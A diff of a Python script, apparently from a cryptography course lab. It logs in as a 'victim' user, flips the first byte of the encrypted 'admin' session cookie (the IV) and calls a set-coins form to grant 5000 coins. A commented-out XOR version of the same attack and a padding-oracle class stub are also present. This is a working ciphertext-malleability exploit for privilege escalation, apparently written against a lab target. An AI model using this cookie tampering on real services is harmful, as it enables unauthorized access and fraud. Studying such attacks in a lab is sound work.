@@ -21,7 +21,7 @@ from maul import do_login_form, do_setcoins_form
 # ciphertexts to the right URL.
 class PaddingOracle(object):
 
-    def __init__(self, po_url):
+    def __init__(self, po_url): 
         self.url = po_url
         self._block_size_bytes = ciphers.algorithms.AES.block_size/8
 
@@ -81,11 +81,44 @@ if __name__ == "__main__":
     pw = "victim"
     assert(do_login_form(sess, uname,pw))
     print("Cookies after logon: {}".format(sess.cookies.get_dict()))
+    admin_cookie = sess.cookies.get_dict()["admin"]
+    print("Admin cookie: {}".format(admin_cookie))
+    admin_cookie_bytes = bytearray.fromhex(admin_cookie)
+    print("Admin cookie bytes: {}".format(admin_cookie_bytes))
+
+    # First byte (C0 == IV)
+    C0 = admin_cookie_bytes[0]
+    print("CO: {}".format(C0))
+    admin_cookie_bytes[0] = 1
+    sess.cookies.set("admin", None)
+    sess.cookies.set("admin", admin_cookie_bytes.hex())
+    print("Cookies after maul: {}".format(sess.cookies.get_dict()))
+    result, response = do_setcoins_form(sess, uname, 5000)
+    print(response.text)
+
+    # TODO: Maul code from part 1.1
+    # Maul the admin cookie in the 'sess' object here
+    # admin_cookie = sess.cookies.get_dict()["admin"]
+    # print("Admin cookie: {}".format(admin_cookie))
+    # admin_cookie_bytes = bytearray.fromhex(admin_cookie)
+    # print("Admin cookie bytes: {}".format(admin_cookie_bytes))
+    # a = admin_cookie_bytes[0]
+    # b = 1
+    # c = a ^ b
+    # admin_cookie_bytes[0] = c
+    # print("XOR value: {}".format(c))
+    # print("Mauled: {}".format(admin_cookie_bytes))
+    # maul = admin_cookie_bytes.hex()
+
+    # # Set new admin cookie with mauled value
+    # sess.cookies.set("admin", None)
+    # sess.cookies.set("admin", maul)
+    # print("Cookies after maul: {}".format(sess.cookies.get_dict()))
     
     # set coins to 5000 coins via the admin's power
-    target_uname = uname
-    amount = 5000
-    result, response = do_setcoins_form(sess, target_uname, amount)
-    print("Attack successful? " + str(result))
-    print("Response: {}".format(response.content))
+    # target_uname = uname
+    # amount = 5000
+    # result, response = do_setcoins_form(sess, target_uname, amount)
+    # print("Attack successful? " + str(result))
+    # print("Response: {}".format(response.content))
 
